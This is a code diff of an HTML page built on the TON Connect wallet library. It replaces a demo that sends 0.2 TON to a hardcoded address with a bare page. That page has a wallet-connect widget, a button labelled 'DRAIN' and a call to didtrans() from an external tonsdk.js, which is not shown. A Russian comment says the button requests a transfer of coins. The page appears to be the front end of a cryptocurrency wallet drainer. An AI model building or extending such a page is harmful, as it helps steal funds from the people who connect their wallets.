@@ -1,60 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>TON</title>
+    
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+    
 </head>
 <body>
 
-<h1>TON Connect Example</h1>
 
-<p>TON Connect и отправка 0.2 TON (!требует подтверждения пользователя).</p>
 
-<div id="ton-connect"></div>
+<div id="ton-connect"></div>  <!--Коннект кошелька-->
+<button onclick="didtrans();" style="MARGIN-TOP:30PX;FONT-SIZE:24PX;">DRAIN</button><!--Запрос трансфера монет-->
 
-<button onclick="connectCustom()">Подключить кошелек, отправить 0.2 TON</button>
 
-<script>
-    const manifestUrl = 'https://sositeyaisa.github.io/ton/tonconnect-manifest.json';
-    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: manifestUrl,
-        buttonRootId: 'ton-connect'
-    });
 
-    // мой адрес кошелька для получения TON
-    const recipientAddress = 'UQA1eukl_AXlRZEt8bE4H_6Efhk413CPgvPMPr5GgJhQqLgh';
 
-    // функция для подключения кошелька и отправки транзакции
-    async function connectCustom() {
-        try {
-            const connectedWallet = await tonConnectUI.connectWallet();
-            console.log("Подключенный кошелек:", connectedWallet);
+<script src="tonsdk.js"></script>
+ 
+    
 
-            const tx = {
-                validUntil: Date.now() + 5 * 60 * 1000,
-                messages: [{
-                    address: recipientAddress,
-                    amount: '200000000' // 0.2 TON (в nanotons)
-                }]
-            };
-            console.log("Объект транзакции:", tx);
 
-            const result = await tonConnectUI.sendTransaction(tx);
-            console.log("Результат транзакции:", result);
-            alert("Транзакция отправлена (0.2 TON)! Хэш: " + result.hash);
-
-        } catch (error) {
-            console.error("Тип ошибки:", typeof error);
-            console.error("Ошибка:", error);
-            console.error("Ошибка в строке:", JSON.stringify(error));
-            alert("Транзакция не удалась проверьте консоль на наличие ошибок.");
-        }
-    }
-</script>
 
 </body>
-</html>
 
+
+</html>
 
 
 
